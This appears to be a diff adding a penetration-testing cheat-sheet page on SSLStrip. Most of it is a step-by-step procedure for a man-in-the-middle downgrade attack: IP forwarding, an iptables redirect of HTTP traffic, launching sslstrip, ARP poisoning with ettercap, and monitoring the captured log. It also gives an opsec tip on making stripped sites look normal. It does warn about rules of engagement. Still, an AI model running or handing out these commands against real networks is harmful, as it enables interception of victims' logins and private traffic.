@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SSLStrip</title>
+</head><body>[SSLStrip](http://www.thoughtcrime.org/software/sslstrip) | uses MitM attack to manipulate HTTP traffic and proxies requests to upstream HTTPS site by using http-to-https redirects <br/>
+<br/>
+Note: manually entered or embedded https:// . . . URLs are not attacked<br/>
+Note: for opsec purposes, check differences between sslstrip and ettercap/bettercap plugins to ensure sites look reasonably correct when stripped<br/>
+<b>WARNING</b>: For scoping purposes, sslstrip removes SSL on ALL websites. There is no filter (maybe with ettercap/bettercap). Because of this, employees/clients browsing PERSONAL websites MAY BE COMPROMISED. Ensure this is in the Rules of Engagment, or limit SSLStrip activity. <br/>
+<br/>
+1. Turn on IP forwarding<br/>
+# sysctl -w net.ipv4.ip_forward=1 <br/>
+or<br/>
+# echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br/>
+<br/>
+2. Use iptables tp set a transparent proxy, redirecting HTTP traffic to the port where SSLStrip is listening<br/>
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080<br/>
+<br/>
+3. Start SSLStrip using -l (lower L) to specify port<br/>
+# sslstrip -l 8080<br/>
+<br/>
+4. Use ettercap/bettercap for MitM<br/>
+# ettercap -TqM arp:remote /&lt;ip&gt;// /&lt;ip&gt;//<br/>
+<br/>
+5. Monitor sslstrip<br/>
+# tail -f sslstrip.log<br/>
+<br/>
+</body></html>
